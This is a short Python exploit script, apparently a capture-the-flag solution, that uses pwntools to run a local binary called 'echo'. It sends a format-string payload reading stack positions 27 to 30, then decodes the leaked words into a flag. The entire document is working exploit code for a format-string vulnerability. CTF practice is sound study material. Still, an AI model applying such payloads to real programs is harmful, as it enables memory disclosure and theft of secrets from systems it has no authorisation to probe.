#!/usr/bin/env python3

import pwn

io = pwn.process("./echo")

payload = b""
payload += b"%27$x."
payload += b"%28$x."
payload += b"%29$x."
payload += b"%30$x."

io.recvuntil(b"> ")
io.sendline(payload)
resp = io.recvline().strip().split(b".")[:-1]

flag = b""

for i in resp :
    flag += int(i, 16).to_bytes(4,"little")

print(flag)
    


